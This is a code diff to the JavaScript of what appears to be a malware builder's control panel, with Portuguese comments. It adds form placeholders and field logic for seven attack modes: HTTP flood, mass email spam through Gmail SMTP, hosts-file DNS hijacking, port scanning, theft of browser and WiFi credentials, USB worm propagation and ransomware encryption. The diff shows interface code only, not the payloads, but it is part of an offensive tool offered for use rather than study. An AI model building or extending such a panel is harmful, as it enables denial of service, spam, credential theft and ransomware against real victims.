@@ -547,21 +547,146 @@
             const attacks = ['http', 'email', 'dns', 'port', 'cred', 'usb', 'ransom'];
             const paramsDiv = document.getElementById('attack-params');
             
+            // Placeholder mappings para cada tipo de ataque
+            const placeholders = {
+                http: {
+                    target: '🌐 http://example.com ou https://api.target.com',
+                    threads: '50',
+                    emailTarget: '',
+                    emailSmtp: '',
+                    emailFrom: '',
+                    emailPass: '',
+                    tip: '⚡ HTTP Flood - Envia múltiplas requisições ao alvo'
+                },
+                email: {
+                    target: '',
+                    threads: '10',
+                    emailTarget: '📧 victim@example.com',
+                    emailSmtp: '📩 smtp.gmail.com:587',
+                    emailFrom: '📤 sender@gmail.com',
+                    emailPass: '🔑 Senha de app ou senha normal',
+                    tip: '📧 Email Spam - Envia emails em massa (usar App Password no Gmail)'
+                },
+                dns: {
+                    target: '',
+                    threads: '',
+                    emailTarget: '',
+                    emailSmtp: '',
+                    emailFrom: '',
+                    emailPass: '',
+                    tip: '⚠️ DNS Hijack - Modifica arquivo hosts (sem parâmetros)'
+                },
+                port: {
+                    target: '🔍 192.168.1.1 ou target.com',
+                    threads: '100',
+                    emailTarget: '',
+                    emailSmtp: '',
+                    emailFrom: '',
+                    emailPass: '',
+                    tip: '🔍 Port Scanning - Escaneia portas abertas no alvo'
+                },
+                cred: {
+                    target: '',
+                    threads: '',
+                    emailTarget: '',
+                    emailSmtp: '',
+                    emailFrom: '',
+                    emailPass: '',
+                    tip: '🔐 Steal Creds - Coleta credenciais do navegador e WiFi (sem parâmetros)'
+                },
+                usb: {
+                    target: '',
+                    threads: '',
+                    emailTarget: '',
+                    emailSmtp: '',
+                    emailFrom: '',
+                    emailPass: '',
+                    tip: '💾 USB Spread - Propaga malware por mídias removíveis (sem parâmetros)'
+                },
+                ransom: {
+                    target: '',
+                    threads: '',
+                    emailTarget: '',
+                    emailSmtp: '',
+                    emailFrom: '',
+                    emailPass: '',
+                    tip: '🔒 File Encryption - Criptografa arquivos (ransomware, sem parâmetros)'
+                }
+            };
+            
+            function updatePlaceholders() {
+                const selectedAttacks = attacks.filter(a => 
+                    document.getElementById(`atk-${a}`)?.checked
+                );
+                
+                const targetInput = document.getElementById('atk-target');
+                const emailTargetInput = document.getElementById('atk-email-target');
+                const emailSmtpInput = document.getElementById('atk-email-smtp');
+                const emailFromInput = document.getElementById('atk-email-from');
+                const emailPassInput = document.getElementById('atk-email-pass');
+                const threadsInput = document.getElementById('atk-threads');
+                
+                // Reset all inputs
+                if (targetInput) targetInput.placeholder = 'Alvo (URL, IP, domínio)';
+                if (emailTargetInput) emailTargetInput.placeholder = 'Email alvo (para spam)';
+                if (emailSmtpInput) emailSmtpInput.placeholder = 'SMTP (ex: smtp.gmail.com)';
+                if (emailFromInput) emailFromInput.placeholder = 'Email remetente';
+                if (emailPassInput) emailPassInput.placeholder = 'Senha SMTP';
+                if (threadsInput) threadsInput.placeholder = 'Número de threads (padrão: 10)';
+                
+                // Mostrar/esconder campos baseado no ataque selecionado
+                const httpSelected = selectedAttacks.includes('http');
+                const emailSelected = selectedAttacks.includes('email');
+                const dnsSelected = selectedAttacks.includes('dns');
+                const portSelected = selectedAttacks.includes('port');
+                const credSelected = selectedAttacks.includes('cred');
+                const usbSelected = selectedAttacks.includes('usb');
+                const ransomSelected = selectedAttacks.includes('ransom');
+                
+                // Mostrar target se http ou port foi selecionado
+                if (targetInput) {
+                    targetInput.style.display = (httpSelected || portSelected) ? 'block' : 'none';
+                }
+                
+                // Mostrar email fields apenas se email foi selecionado
+                if (emailTargetInput) emailTargetInput.style.display = emailSelected ? 'block' : 'none';
+                if (emailSmtpInput) emailSmtpInput.style.display = emailSelected ? 'block' : 'none';
+                if (emailFromInput) emailFromInput.style.display = emailSelected ? 'block' : 'none';
+                if (emailPassInput) emailPassInput.style.display = emailSelected ? 'block' : 'none';
+                
+                // Mostrar threads se http, email ou port foi selecionado
+                if (threadsInput) {
+                    threadsInput.style.display = (httpSelected || emailSelected || portSelected) ? 'block' : 'none';
+                }
+                
+                // Aplicar placeholders personalizados
+                selectedAttacks.forEach(atk => {
+                    const ph = placeholders[atk];
+                    if (ph.target && targetInput) targetInput.placeholder = ph.target;
+                    if (ph.emailTarget && emailTargetInput) emailTargetInput.placeholder = ph.emailTarget;
+                    if (ph.emailSmtp && emailSmtpInput) emailSmtpInput.placeholder = ph.emailSmtp;
+                    if (ph.emailFrom && emailFromInput) emailFromInput.placeholder = ph.emailFrom;
+                    if (ph.emailPass && emailPassInput) emailPassInput.placeholder = ph.emailPass;
+                    if (ph.threads && threadsInput) threadsInput.placeholder = `Threads: ${ph.threads}`;
+                });
+                
+                // Mostrar/esconder div de parâmetros
+                if (selectedAttacks.length > 0) {
+                    paramsDiv.classList.add('show');
+                } else {
+                    paramsDiv.classList.remove('show');
+                }
+            }
+            
             attacks.forEach(atk => {
                 const checkbox = document.getElementById(`atk-${atk}`);
                 if (checkbox) {
-                    checkbox.addEventListener('change', () => {
-                        const anyChecked = attacks.some(a => 
-                            document.getElementById(`atk-${a}`)?.checked
-                        );
-                        if (anyChecked) {
-                            paramsDiv.classList.add('show');
-                        } else {
-                            paramsDiv.classList.remove('show');
-                        }
-                    });
+                    checkbox.addEventListener('change', updatePlaceholders);
                 }
             });
+            
+            // Initial update
+            updatePlaceholders();
         }
 
         function getAttackScript(attackType, params) {
